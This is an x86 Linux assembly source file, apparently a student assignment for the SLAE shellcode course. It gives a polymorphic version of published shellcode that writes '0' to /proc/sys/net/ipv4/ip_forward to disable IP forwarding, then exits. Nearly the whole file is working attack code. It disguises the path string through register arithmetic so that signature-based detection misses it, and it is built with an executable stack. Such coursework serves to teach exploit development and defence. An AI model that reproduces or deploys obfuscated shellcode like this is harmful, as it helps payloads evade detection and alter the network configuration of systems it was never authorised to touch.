; Title 	: SLAE Linux/x86 - Assignment-6.1
; Description	: Polymorphic version of Linux/x86 - Set '/proc/sys/net/ipv4/ip_forward' to '0' & exit() - 83 Bytes
; Original 	: http://shell-storm.org/shellcode/files/shellcode-848.php
; Author	: Rizal Muhammed (UB3RSiCK)
; Student ID	: SLAE 933
; Shellcode Len.: 106 Bytes (~27.8% increase)
;
; nasm -f elf32 shellcode-848-poly.nasm -o shellcode-848-poly.o
; ld shellcode-848-poly.o -o shellcode-848-poly -z execstack

section .text
global _start

_start:


        xor eax,eax
        push eax
        
	;push dword 0x64726177
	push dword 0x63716076
	pop ebx				; 0x64726177 = 0x63716076 + 0x01010101
	add ebx, 0x01010101
	push ebx
        
	;push dword 0x726f665f
	add ebx, 0xdfd04e8		; 0x726f665f = 0x64726177 + 0xdfd04e8
	push ebx

        ;push dword 0x70692f34
	sub ebx, 0x206372b		; 0x70692f34 = 0x726f665f - 0x206372b
	push ebx	

        ;push dword 0x7670692f
	add ebx, 0x60739fb		; 0x7670692f = 0x70692f34 + 0x60739fb
	push ebx

        ;push dword 0x74656e2f
	sub ebx, 0x20afb01		; 0x74656e2f = 0x7670692f - 0x20afb01 + 1
	inc ebx				; +1 to avoid null byte [0x7670692f - 0x74656e2f] = [0x20afb00]
	push ebx

        ;push dword 0x2f737973
	sub ebx, 0x44f1f4bc		; 0x2f737973 = 0x74656e2f - 0x44f1f4bc
	push ebx

        ;push dword 0x2f636f72
	sub ebx, 0x11223344		; 0x2f737973 - 0x11223344 + 0x11122943 = 0x2f636f72
	add ebx, 0x11122943
	push ebx

        push word 0x702f

        mov ebx,esp


	;xor ecx,ecx
        ;mov cl,0x1
	push 0x1
	pop ecx
	
        mov al,0x5
        int 0x80

        ;mov ebx,eax
	push eax
	pop ebx

        xor ecx,ecx
        push ecx
        push byte +0x30
        mov ecx,esp
        
	;xor edx,edx
        ;mov dl,0x1
	push 0x1
	pop edx
	
        mov al,0x4
        int 0x80

        ;xor eax,eax
        ;add eax,byte +0x6
	push 0x6
	pop eax

        int 0x80

        ;xor eax,eax
        ;inc eax
	push 0x1
	pop eax

        xor ebx,ebx
        int 0x80

